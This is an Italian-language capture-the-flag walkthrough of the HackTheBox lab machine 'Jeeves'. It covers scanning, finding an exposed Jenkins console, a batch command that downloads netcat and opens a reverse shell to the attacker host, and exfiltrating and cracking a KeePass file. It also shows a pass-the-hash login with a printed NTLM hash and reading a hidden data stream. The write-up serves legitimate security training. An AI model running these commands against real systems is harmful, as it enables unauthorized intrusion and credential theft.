# Jeeves

## Reconnaissance

Per prima cosa eseguo una scansione iniziale con _nmapAutomator_.

```text
sudo nmapAutomator.sh --host 10.10.10.63 --type All
```

Il risultato della scansione è il seguente:

```text
Host is likely running Windows


---------------------Starting Port Scan-----------------------

PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
50000/tcp open  ibm-db2



---------------------Starting Script Scan-----------------------

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Ask Jeeves
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 5h00m00s, deviation: 0s, median: 4h59m59s
| smb2-time:
|   date: 2024-01-09T15:22:37
|_  start_date: 2024-01-09T15:21:19
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)


---------------------Starting Vulns Scan-----------------------

Running CVE scan on all ports

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows


Running Vuln scan on all ports
This may take a while, depending on the number of detected services..

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-csrf:
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.63
|   Found the following possible CSRF vulnerabilities:
|     
|     Path: http://10.10.10.63:80/
|     Form id:
|_    Form action: error.html
|_http-server-header: Microsoft-IIS/10.0
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum:
|_  /error.html: Potentially interesting folder
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-054: false
|_samba-vuln-cve-2012-1182: No accounts left to try
|_smb-vuln-ms10-061: No accounts left to try

```

## Enumeration
Successivamente, visito la pagina http://10.10.10.63/:

<p align="center">
  <img src="/Immagini/Windows-Box/Jeeves/jeeves-1.png"/>
</p>

Provo ad utilizzare il comando _dirsearch_:

```text
dirsearch -u http://10.10.10.63/
```

```text
Target: http://10.10.10.63/

[05:24:46] Starting:

[05:25:11] 200 -   50B  - /index.html
[05:25:16] 200 -   50B  - /error.html
```

Visito la pagina http://10.10.10.63/error.html:

<p align="center">
  <img src="/Immagini/Windows-Box/Jeeves/jeeves-2.png"/>
</p>

Visito la pagina http://10.10.10.63:50000:

<p align="center">
  <img src="/Immagini/Windows-Box/Jeeves/jeeves-3.png"/>
</p>

Utilizzo _dirbuster_ sulla porta 50000:

<p align="center">
  <img src="/Immagini/Windows-Box/Jeeves/jeeves-5.png"/>
</p>

Vado sulla pagina http://10.10.10.63:50000/askjeeves/:

<p align="center">
  <img src="/Immagini/Windows-Box/Jeeves/jeeves-4.png"/>
</p>

Quindi la directory _askjeeves_ contiene _jenkins 2.87_.

## Exploitation

Dopo aver fatto delle ricerche scopro che è possbile ottenere una reverse shell attraverso la creazione di un nuovo item. In particolare nella sezione "BUILD" bisogna selezionare la voce "Execute Windows batch command" e inserire il seguente codice:

```text
powershell wget "http://10.10.14.7:8888/nc.exe" -outfile "nc.exe"
nc.exe -e cmd.exe 10.10.14.7 4444
```

Prima di completare salvare il nuovo item, scarico netcat da [qui](https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip), avvio un server sulla porta 8080 per poter scaricare l'eseguibile nc.exe (dalla macchina vittima) e un listener sulla porta 4444.

<p align="center">
  <img src="/Immagini/Windows-Box/Jeeves/jeeves-6.png"/>
</p>

**Sono dentro!**

## Privilege Escalation
Utilizzo Windows Exploit Suggester per identificare delle patch mancanti che possono permettere di scalare privilegi.

Per prima cosa aggiorno il database:

```text
python2 windows-exploit-suggester.py --update
```

Copio il risultato del comando _systeminfo_ eseguito sulla macchina vittima e lo salvo all'interno del file _systeminfo.txt_.

Poi lancio l'exploit suggester:

```text
python2 windows-exploit-suggester.py --database 2024-01-09-mssb.xls --systeminfo systeminfo.txt
```

Ottengo il seguente risultato:

```text
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)
[*] querying database file for potential vulnerabilities
[*] comparing the 11 hotfix(es) against the 160 potential bulletins(s) with a database of 137 known exploits
[*] there are now 160 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 10 64-bit'
[*]
[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255
[*]
[E] MS16-129: Cumulative Security Update for Microsoft Edge (3199057) - Critical
[*]   https://www.exploit-db.com/exploits/40990/ -- Microsoft Edge (Windows 10) - 'chakra.dll' Info Leak / Type Confusion Remote Code Execution
[*]   https://github.com/theori-io/chakra-2016-11
[*]
[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
[*]
[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important
[*]   https://github.com/foxglovesec/RottenPotato
[*]   https://github.com/Kevin-Robertson/Tater
[*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege
[*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation
[*]
[E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important
[*]   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074), PoC
[*]   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC
[*]
[E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical
[*]   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC
[*]
[E] MS16-056: Security Update for Windows Journal (3156761) - Critical
[*]   https://www.exploit-db.com/exploits/40881/ -- Microsoft Internet Explorer - jscript9 Java­Script­Stack­Walker Memory Corruption (MS15-056)
[*]   http://blog.skylined.nl/20161206001.html -- MSIE jscript9 Java­Script­Stack­Walker memory corruption
[*]
[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
[*]   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF
[*]   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC
[*]   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC
[*]   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)
[*]
[M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important
[*]   https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF
[*]   https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS16-016) (2), PoC
[*]   https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS16-016) (1), PoC
[*]
[E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important
[*]   Windows 7 SP1 x86 - Privilege Escalation (MS16-014), https://www.exploit-db.com/exploits/40039/, PoC
[*]
[E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important
[*]   https://www.exploit-db.com/exploits/39232/ -- Microsoft Windows devenum.dll!DeviceMoniker::Load() - Heap Corruption Buffer Underflow (MS16-007), PoC
[*]   https://www.exploit-db.com/exploits/39233/ -- Microsoft Office / COM Object DLL Planting with WMALFXGFXDSP.dll (MS-16-007), PoC
[*]
[E] MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important
[*]   https://www.exploit-db.com/exploits/38968/ -- Microsoft Office / COM Object DLL Planting with comsvcs.dll Delay Load of mqrt.dll (MS15-132), PoC
[*]   https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object els.dll DLL Planting (MS15-134), PoC
[*]
[E] MS15-112: Cumulative Security Update for Internet Explorer (3104517) - Critical
[*]   https://www.exploit-db.com/exploits/39698/ -- Internet Explorer 9/10/11 - CDOMStringDataList::InitFromString Out-of-Bounds Read (MS15-112)
[*]
[E] MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege (3096447) - Important
[*]   https://www.exploit-db.com/exploits/38474/ -- Windows 10 Sandboxed Mount Reparse Point Creation Mitigation Bypass (MS15-111), PoC
[*]
[E] MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important
[*]   https://www.exploit-db.com/exploits/38202/ -- Windows CreateObjectTask SettingsSyncDiagnostics Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38200/ -- Windows Task Scheduler DeleteExpiredTaskAfter File Deletion Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38201/ -- Windows CreateObjectTask TileUserBroker Privilege Escalation, PoC
[*]
[E] MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution (3089656) - Critical
[*]   https://www.exploit-db.com/exploits/38198/ -- Windows 10 Build 10130 - User Mode Font Driver Thread Permissions Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38199/ -- Windows NtUserGetClipboardAccessToken Token Leak, PoC
```

Provo a sfruttare qualche vulnerabilità ma senza successo.

Tra i documenti dell'utente trovo questo:

<p align="center">
  <img src="/Immagini/Windows-Box/Jeeves/jeeves-7.png"/>
</p>

Per trasferire il file utilizzo netcat:

```text
nc -lp 9191 > jeeves.kdbx
```

```text
nc.exe -w 3 10.10.14.7 9191 < C:\Users\kohsuke\Documents\CEH.kdbx
```

Estraggo l'hash tramite _keepass2hohn_ e poi su questo uso _johntheripper_. Una volta ottenuta la password (_moonshine1_) accedo al database:

<p align="center">
  <img src="/Immagini/Windows-Box/Jeeves/jeeves-8.png"/>
</p>

Al suo interno sono presenti diverse voci, ma solo _Backup stuff_ è importante. In particolare questo è un file hash NTLM per l'utente Administrator. Quindi, utilizzando la tecnica _pass-the-hash_ posso generare una sessione remota ottenendo una reverse-shell con privilegi da amministratore:

```text
pth-winexe -U jeeves/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.63 cmd
```

<p align="center">
  <img src="/Immagini/Windows-Box/Jeeves/jeeves-9.png"/>
</p>

**Sono root!**

Vado alla ricerca del flag.

<p align="center">
  <img src="/Immagini/Windows-Box/Jeeves/jeeves-10.png"/>
</p>

Il flag sembra nascosto, quindi provo ad utilizzare il seguente comando:

<p align="center">
  <img src="/Immagini/Windows-Box/Jeeves/jeeves-11.png"/>
</p>

Per leggere lo stream utilizzo questo comando powershell:

```text
powershell Get-Content -Path "hm.txt" -Stream "root.txt"
```

**Ottengo cosi l'utlimo flag!**
